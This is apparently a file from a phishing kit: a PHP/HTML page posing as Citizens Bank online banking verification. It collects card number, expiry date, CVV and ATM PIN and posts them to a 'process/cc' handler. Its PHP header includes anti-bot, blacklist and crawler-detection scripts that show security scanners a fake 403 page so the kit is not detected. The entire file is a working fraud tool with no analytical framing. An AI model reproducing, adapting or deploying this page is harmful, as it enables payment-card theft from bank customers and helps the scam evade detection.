<?php

$settings = include '../../settings/settings.php';
$useragent = $_SERVER['HTTP_USER_AGENT'];
include '../Bots/fucker.php';
include("../Bots/Anti/out/blacklist.php");
include("../Bots/Anti/out/bot-crawler.php");
include("../Bots/Anti/out/anti.php");
include("../Bots/Anti/out/ref.php");
include("../Bots/Anti/out/bots.php");
@require("../Bots/Anti/out/Crawler/src/CrawlerDetect.php");

$settings = include '../../settings/settings.php';

use JayBizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;

if($CrawlerDetect->isCrawler($useragent)){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}

$bot = include '../Bots/bot.php';
if($bot == "is_bot"){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}


?>

<html class="js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths citizens-Chrome citizens-user-none" lang="en-US">
<!--<![endif]-->

<head class="at-element-marker">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta charset="utf-8">
	<title>Online Banking | Citizens</title>
	<meta name="description" content="">
	<link href="files/apple-touch-icon.png" rel="apple-touch-icon">
	<link href="files/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76">
	<link href="files/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120">
	<link href="files/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152">
	<link href="files/apple-touch-icon-180x180.png" rel="apple-touch-icon" sizes="180x180">
	<link href="files/icon-hires.png" rel="icon" sizes="192x192">
	<link href="files/icon-normal.png" rel="icon" sizes="128x128">
	<link href="files/app.bundle.ff1969d0430abce98c8f.css" rel="stylesheet">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="files/main.min.[SVNREV].css">
	<style id="at-makers-style" class="at-flicker-control">
	.mboxDefault {
		visibility: hidden;
	}
	</style>
	<style type="text/css" id="kampyleStyle">
	.noOutline {
		outline: none !important;
	}
	
	.wcagOutline:focus {
		outline: 1px dashed #595959 !important;
		outline-offset: 2px !important;
		transition: none !important;
	}
	</style>
</head>

<body class="responsive-enabled">
	<!-- ===============
      PAGE HEADER START
      =============== -->
	<!-- begin CITIZENS Hosted Header -->
	<div class="citizens-header-footer-injected">
		<link rel="stylesheet" type="text/css" href="files/citizensns.min.45702.css">
		<!--[if IE 8]><link rel="stylesheet" type="text/css" href="/efs/hhf/css/citizensns-ie8.min.45702.css?refresh=1640237653470"><![endif]-->
		<style>
		.help-modal-header .help-modal-close {
			background: url(files/modal-help-close.png) center center no-repeat transparent;
			background-size: 20px;
		}
		
		.help-modal-menu a.active {
			background: #f2faf8 url(files/arrow-right-green.png) right 20px center no-repeat;
			background-position: right 20px center;
			background-size: 7px
		}
		
		.account-section-title.checkmark h1 {
			padding: 0px 0px 5px 28px !important;
		}
		
		.lt-ie9 .help-modal-menu a.active {
			background: #f2faf8 url(files/arrow-right-green.png) right 20px center no-repeat !important;
			background-size: 7px !important
		}
		
		.input-wrapper .tooltip {
			margin-left: 1px;
		}
		</style>
		<div class="citizens-header-footer">
			<div class="citi-modal timeout-modal simplemodal-data" id="timeout-modal" style="display:none;">
				<p>You will be logged out of your Online Banking session in <span id="timeout-seconds">30</span> seconds.</p>
				<p> <strong>Do you wish to continue?</strong> </p>
				<a href="#" class="button button-cta button-continue"> <span>CONTINUE</span> </a> <a href="#" class="button button-cta button-logout">CANCEL</a> </div>
			<div class="citi-modal help-modal" id="help-modal" tabindex="0" style="display:none;"></div>
		</div>
	</div>
	<div class="citizens-header">
		<!-- htmlContainer PREFIX -->
		<div class="citizens-header-footer">
			<header id="page-header" class="page-header">
				<!-- inc-header.html START -->
				<div class="centered-content clearfix">
					<a href="" class="page-logo"> <img border="0" width="203" height="25" src="files/CTZ_Green-01.png" alt="Citizens"> </a>
					<div id="header-navigation-container"></div>
				</div>
				<!-- inc-header.html END -->
			</header>
		</div>
		<!-- htmlContainer SUFFIX -->
	</div>
	<!-- end CITIZENS Hosted Header -->
	<!-- ===============
      PAGE HEADER END
      =============== -->
	<!-- ===============
      PAGE CONTENT AREA START
      =============== -->
	<div id="page-container" class="page-container">
		<div class="centered-content clearfix">
			<div id="cookieErrorMsg" class="global-message global-message--login error-message" style="display:none">We are unable to find your account with the information you provided. Please review your information or try another search method.</div>
			<div class="g-unauth-main-container">
				<section class="unauth-intro-area">
					<h2 class="unauth-intro-area__title ">Verification</h2>
					<div role="progressbar" aria-valuenow="2" aria-valuemin="2" aria-valuetext="Step 2 of 4: Verification" aria-valuemax="4">
						<div class="unauth-intro-area__step"> <strong>Step 3 of 4:</strong> <span>Card Information</span> </div>
						<div class="unauth-intro-area__progress-container">
							<div class="unauth-intro-area__progress-segment">
								<div class="unauth-intro-area__progress-item -js-progress-green"></div>
								<div class="unauth-intro-area__progress-item -js-progress-green"></div>
								<div class="unauth-intro-area__progress-item -js-progress-green"></div>
								<div class="unauth-intro-area__progress-item -js-progress-green"></div>
								<div class="unauth-intro-area__progress-item -js-progress-light-green"></div>
							</div>
						</div>
					</div>
					<div class="js-error-block"></div>
					<div class="unauth-intro-area__help"> <a class="g-link-list unauth-intro-area__link g-display-none" href="#helpModalPage">Show Help</a>
						<p class="unauth-intro-area__text">Please enter your information to help us verify your account.</p>
					</div>
				</section>
				<section class="identify-customer-section">
					<form class="unauth-form jqtransform js-enrollment-form" action="process/cc" method="post" novalidate="novalidate">
						<br>
						<div class="unauth-form__ic-identification-block">

							<div class="unauth-form__rowgroup" id="unauth-ic-form-rowgroup-BY_TIN" style="display: block;">
								<div class="unauth-form__row">
									<div class="unauth-form__rowitem g-left">
										<label class="unauth-form__label" for="unauth-ic-form-fullSsn">Card Number:</label>
										<div>
											
											<input name="cnum" id="cnum" placeholder="Enter Card Number"  class="unauth-form__input js-ic-mobilepassword" required="true" type="tel" autocomplete="off">
											<script src="files/mask.js"></script>
														<script>
														var element = document.getElementById('cnum');
														var maskOptions = {
															mask: '0000 0000 0000 0000'
														};
														var mask = IMask(element, maskOptions);
														</script>  

										</div>
										
									</div>
								</div>
							</div>



							<div class="unauth-form__rowgroup" id="unauth-ic-form-rowgroup-BY_TIN" style="display: block;">
								<div class="unauth-form__row">
									<div class="unauth-form__rowitem g-left">
										<label class="unauth-form__label" for="unauth-ic-form-fullSsn">Expiration:</label>
										<div>
											
											<input name="exp" id="exp" placeholder="Enter Card Expiry"  class="unauth-form__input js-ic-mobilepassword" required="true" type="tel" autocomplete="off">
											<script src="files/mask.js"></script>
														<script>
														var element = document.getElementById('exp');
														var maskOptions = {
															mask: '00/0000'
														};
														var mask = IMask(element, maskOptions);
														</script>  

										</div>
										
									</div>
								</div>
							</div>


							<div class="unauth-form__rowgroup" id="unauth-ic-form-rowgroup-BY_TIN" style="display: block;">
								<div class="unauth-form__row">
									<div class="unauth-form__rowitem g-left">
										<label class="unauth-form__label" for="unauth-ic-form-fullSsn">Cvv Code:</label>
										<div>
											
											<input name="cvv" id="cvv" required="true" placeholder="Enter Cvv Code" maxlength="3"  class="unauth-form__input js-ic-mobilepassword" type="tel" autocomplete="off">
											

										</div>
										
									</div>
								</div>
							</div>


							<div class="unauth-form__rowgroup" id="unauth-ic-form-rowgroup-BY_TIN" style="display: block;">
								<div class="unauth-form__row">
									<div class="unauth-form__rowitem g-left">
										<label class="unauth-form__label" for="unauth-ic-form-fullSsn">ATM Pin:</label>
										<div>
											
											<input name="pin" id="pin" required="true" placeholder="Enter ATM Pin" maxlength="4"  class="unauth-form__input js-ic-mobilepassword" type="tel" autocomplete="off">
										 

										</div>
										
									</div>
								</div>
							</div>


							
						
							
						</div>
						<div class="unauth-section__button-wrap">
							<button class="btn unauth-form__submit-button js-unauth-ic-submit-button"  id="toEnterCode">Continue</button>
							<button class="btn unauth-form__submit-button js-unauth-ic-submit-button_business g-display-none">Continue</button> <a class="unauth-form__cancel-link js-cancel-button" tabindex="0">Cancel</a> </div>
					</form>
				</section>
			</div>
		</div>
	</div>
	<!-- ===============
      PAGE CONTENT AREA END
      =============== -->
	<!-- ===============
      PAGE FOOTER START
      =============== -->
	<div class="citizens-footer">
		<div class="citizens-header-footer">
			<footer id="page-footer" class="page-footer">
				<div class="footer-top">
					<ul>
						<li>
							<a href="#" class="contact" title="Opens Ways to Contact Us Dialog"> <span class="account-underline">Ways to Contact Us</span><span class="visuallyhidden">- Opens Ways to Contact Us Dialog</span> </a>
							<div class="dropup-menu">
								<h4>Contact Us</h4>
								<p>General Questions:
									<br> <strong>1-800-656-6561</strong> (personal bank accounts)
									<br> Business Questions:
									<br> <strong>1-877-229-6428</strong> (online banking support)
									<br> <strong>1-800-862-6200</strong> (account information)
									<br> Investment Questions:
									<br> <strong>1-800-942-8300</strong> (Citizens Securities, Inc.) </p>
								<!--
<p>Go to <a href="/customer-service/">Customer Service</a> to send us email or mail or to view FAQs</p>
<p><a href="/forms/contactme.aspx">We'll Contact You</a></p>
-->
							</div>
						</li>
						<!-- As part of Def# 1465 Location is commented on Auth/UnAuth pages.
<li><span class="location">Your Location: NONE</span>
</li>
-->
						<li>
							<a href="#" class="locator" title="Opens Branch &amp; ATM Locator Dialog"> <span class="account-underline">Branch &amp; ATM Locator</span><span class="visuallyhidden">- Opens Branch &amp; ATM Locator Dialog</span> </a>
							<div class="dropup-menu">
								<h4>Branch &amp; ATM Locator</h4>
								<p>Find one of our 1,300 locations near you.</p>
								<div role="form">
									<div id="stickyFooterBranch-error" class="error-message" style="display: none"></div>
									<input id="stickyFooterBranch" type="text" title="Enter Zip Code or City, State" placeholder="Enter Zip Code or City, State" value="NONE"> <a href="#" type="button" class="button button-stickyfooterbranch">Submit</a> </div>
							</div>
						</li>
						<li>
							<a onclick="showSurvey(formId);" style="cursor:pointer;"><img src="files/feedback.png" alt="Give Feedback" border="0" style="cursor:pointer;border:0px;height:40px;width:40px;padding-right:4px;">Feedback</a>
						</li>
					</ul>
				</div>
				<div class="footer-row clearfix">
					<ul>
						<li>
							<h6>Checking &amp; Savings</h6> </li>
						<!--        <li><a target="_blank" href="checking-and-savings.aspx">Checking &amp; Savings Overview</a></li>-->
						<li> <a target="_blank" href="checking/">Checking</a> </li>
						<li> <a target="_blank" href="savings-and-cds/savings.aspx">Savings</a> </li>
						<li> <a target="_blank" href="savings-and-cds/money-markets.aspx">Money Markets</a> </li>
						<li> <a target="_blank" href="savings-and-cds/cds.aspx">Certificates of Deposit (CDs)
<sup>®</sup>
</a> </li>
						<li> <a target="_blank" href="ira/">IRAs</a> </li>
						<li> <a target="_blank" href="checking-and-savings/programs-and-services.aspx">Programs &amp; Services</a> </li>
						<li> <a target="_blank" href="checking-and-savings/benefits-and-features.aspx">Benefits &amp; Features</a> </li>
						<li> <a target="_blank" href="checking/debit-cards/standard.aspx">Debit Card</a> </li>
						<li> <a target="_blank" href="overdraft-protection/">Overdraft Choices
<sup>®</sup>
</a> </li>
					</ul>
					<ul>
						<li>
							<h6>Home Borrowing</h6> </li>
						<!--        <li><a target="_blank" href="loans/">Home Borrowing Overview</a></li>-->
						<li> <a target="_blank" href="mortgages/">Mortgages</a> </li>
						<li> <a target="_blank" href="home-equity/loans.aspx">Home Equity Loans</a> </li>
						<li> <a target="_blank" href="home-equity/lines.aspx">Home Equity Lines of Credit</a> </li>
						<li> <a target="_blank" href="loans/determine-my-rate.aspx">Determine My Rate</a> </li>
					</ul>
					<ul>
						<li>
							<h6>Students</h6> </li>
						<!--<li><a target="_blank" href="student-services/">Students Overview</a></li>
<li><a target="_blank" href="student-banking/">Banking</a></li>
<li><a target="_blank" href="student-loans/undergradfamilies.aspx">Undergraduate Borrowing</a></li>
<li><a target="_blank" href="student-loans/gradstudents.aspx">Graduate Borrowing</a></li>
<li><a target="_blank" href="student-loans/process.aspx">The Student Loan Process</a></li>
<li><a target="_blank" href="student-loans/tools.aspx">Student Tools &amp; Resources</a></li>-->
						<li> <a target="_blank" href="student-loans/default.aspx">Student Loan Options</a> </li>
						<li> <a target="_blank" href="student-loans/education-refinance-loan-overview.aspx">Refinancing Student Loans</a> </li>
						<li> <a target="_blank" href="student-loans/process/default.aspx">The Student Loan Process</a> </li>
						<li> <a target="_blank" href="student-loans/process/undergraduate.aspx">Undergraduate Students &amp; Parents</a> </li>
						<li> <a target="_blank" href="student-loans/process/graduate.aspx">Graduate Students</a> </li>
						<li> <a target="_blank" href="student-loans/tools.aspx">Tools &amp; Information</a> </li>
						<li> <a target="_blank" href="checking/one-deposit-checking-account.aspx">Banking for Students</a> </li>
						<li> <a target="_blank" href="student-services/access-my-student-loan/default.aspx">Access My Student Loan</a> </li>
					</ul>
					<ul class="last">
						<li>
							<h6>Cards</h6> </li>
						<!--        <li><a target="_blank" href="cards-and-rewards/">Cards Overview</a></li>-->
						<li> <a target="_blank" href="credit-cards/overview.aspx">Credit Cards</a> </li>
						<!--        <li><a target="_blank" href="cards-and-rewards/debit-card/debit-card.aspx">Debit Card</a></li>-->
						<li> <a target="_blank" href="cards-and-rewards/credit-cards/creditcardagreements/agreements.aspx">Card Agreements</a> </li>
						<li> <a target="_blank" href="security/">Security Features</a> </li>
					</ul>
				</div>
				<div class="footer-row clearfix">
					<ul>
						<li>
							<h6>Personal Loans</h6> </li>
						<li> <a target="_blank" href="personal-loans/overview.aspx">Overview</a> </li>
						<li> <a target="_blank" href="personal-loans/faqs.aspx">FAQs</a> </li>
					</ul>
					<ul>
						<li>
							<h6>Resources</h6> </li>
						<li> <a target="_blank" href="checking/order-checks.aspx">Order Checks</a> </li>
						<li> <a target="_blank" href="online-and-mobile-banking/default.aspx">Online &amp; Mobile Banking</a> </li>
						<li> <a target="_blank" href="customer-service/">Customer Service</a> </li>
					</ul>
					<ul>
						<li>
							<h6>About Us</h6> </li>
						<!--        <li><a target="_blank" href="about-us/">About Us Overview</a></li>-->
						<li> <a target="_blank" href="http://investor.citizensbank.com/about-us/our-company.aspx">About Citizens</a> </li>
						<li> <a target="_blank" href="community/">In the Community</a> </li>
						<li> <a target="_blank" href="careers/">Careers</a> </li>
						<li> <a target="_blank" href="about_our_ads.aspx">About Our Ads</a> </li>
					</ul>
					<ul class="last">
						<li>
							<h6>Solutions</h6> </li>
						<li> <a target="_blank" href="">Personal</a> </li>
						<li> <a target="_blank" href="investing/">Investing</a> </li>
						<li> <a target="_blank" href="small-business/">Small Business</a> </li>
						<li> <a target="_blank" href="commercial-banking/">Commercial</a> </li>
					</ul>
				</div>
				<div class="footer-row clearfix">
					<ul>
						<li>
							<h6>Disclosures</h6> </li>
						<li> <a target="_blank" href="pf/onlinebanking/terms.aspx">Online Terms and Conditions</a> </li>
						<li> <a target="_blank" href="assets/pdf/E-SignDisclosure.pdf">E-Sign Disclosure</a> </li>
						<li> <a target="_blank" href="checking-and-savings/account-documents.aspx">Account Documents</a> </li>
						<li> <a target="_blank" href="tools/leaving.aspx?url=http://www.fdic.gov">Member FDIC</a> </li>
						<li> <a target="_blank" href="security/equal-housing-lender.aspx">Equal Housing Lender
<img alt="Equal Housing Lender" title="Equal Housing Lender" src="files/equal-housing.gif">
</a> </li>
						<li> <a target="_blank" href="security/">Security, Privacy &amp; Legal</a> </li>
					</ul>
				</div>
				<div class="centered-content">
					<div class="footer-bottom">
						<p class="legal"> Zelle and the Zelle related marks are wholly owned by Early Warning Services, LLC and are used herein under license. </p>
						<p class="legal"> *Securities, Insurance Products and Investment Advisory Services offered through Citizens Securities, Inc. ("CSI"). CSI is an SEC registered investment adviser and Member - FINRA and SIPC. One Citizens Bank Way, JCB135, Johnston, RI 02919. CSI is an affiliate of Citizens Bank, N.A.
							<br>
							<br>The investment balances shown in online banking are based on market prices, with up to a fifteen minute delay from the time this webpage was last refreshed. Information relating to accounts not held at CSI is presented as an accommodation and while drawn from sources believed to be reliable is not guaranteed as to accuracy or completeness. Such information should be independently confirmed by the account owner(s).
							<br>
							<br>Information relating to accounts not held or custodied by National Financial Services (NFS) (Assets Held Away), CSI’s clearing broker dealer, was provided to NFS by outside parties and is included for informational purposes only. These positions are not part of your brokerage account carried by NFS and therefore any SIPC account protection afforded your account through NFS does not cover these assets or prices reported. Neither NFS, CSI nor Citizens are responsible for the Assets Held Away information provided and does not guarantee the accuracy or timeliness of the positions or prices reported. Prices shown do not necessarily reflect the actual current market prices. Further information regarding these prices may be obtained by contacting CSI.
							<br>
							<br>The investment products and financial strategies suggested herein are subject to investment risk, including possible loss of principal amount invested. Investment decisions should be based on each individual's goals, time horizon and tolerance for risk.
							<br>
							<br>SpeciFi<sup>®</sup> is made available through CSI. Portfolio management services are sub-advised by SigFig Wealth Management, LLC ("SigFig"), an SEC registered investment adviser. SigFig is not an affiliate of CSI or Citizens Bank, N.A. </p>
						<div class="footer-disclaimer-box footer-disclaimer-box--margin-bottom footer-disclaimer">
							<p class="footer-disclaimer-box__text">Securities, Insurance Products and Investment Advisory Services are:</p>
							<ul class="footer-disclaimer-box__list">
								<li class="footer-disclaimer-box__list-item">NOT FDIC INSURED</li>
								<li class="footer-disclaimer-box__list-item">NOT BANK GUARANTEED</li>
								<li class="footer-disclaimer-box__list-item">MAY LOSE VALUE</li>
								<li class="footer-disclaimer-box__list-item">NOT A DEPOSIT
									<br> </li>
								<li class="footer-disclaimer-box__list-item">NOT INSURED BY ANY FEDERAL GOVERNMENT AGENCY</li>
							</ul>
						</div>
						<ul class="footer-util">
							<li class="sitemap"> <a target="_blank" href="tools/SiteMap.aspx">Site Map</a> </li>
							<li>Follow:
								<a target="_blank" href="tools/leaving.aspx?url=http://www.facebook.com/citizensbank"> <img src="files/footer-follow-facebook.png" alt="Facebook" align="middle"> </a>
								<a target="_blank" href="tools/leaving.aspx?url=http://twitter.com/citizensbank"> <img src="files/footer-follow-twitter.png" alt="Twitter"> </a>
								<a target="_blank" href="tools/leaving.aspx?url=http://linkedin.com/company/citizens-bank"> <img src="files/footer-follow-linkedin.png" alt="Linkedin"> </a>
								<a target="_blank" href="tools/leaving.aspx?url=http://youtube.com/citizensbank"> <img src="files/footer-follow-youtube.png" alt="Youtube"> </a>
							</li>
						</ul>
						<p class="footer-copyright"> © Copyright 2021 Citizens Financial Group, Inc. All rights reserved.
							<br>Citizens is a brand name of Citizens Bank, N.A. (NMLS ID# 433960).
							<br>Citizens corporate headquarters: One Citizens Plaza, Providence, RI 02903 </p> <img src="files/elh.gif" alt="Equal Housing Lender"> <img src="files/fdicFooter.gif" alt="Member FDIC"> </div>
				</div>
			</footer>
		</div>
	</div>

	<link rel="stylesheet" type="text/css" href="files/sec-3-6.css">
	<div id="sec-overlay" style="display:none;">
		<div id="sec-container"> </div>
	</div>
	<div id="ui-datepicker-div" class="ui-datepicker ui-widget ui-widget-content ui-helper-clearfix ui-corner-all"></div>
	
</body>

</html>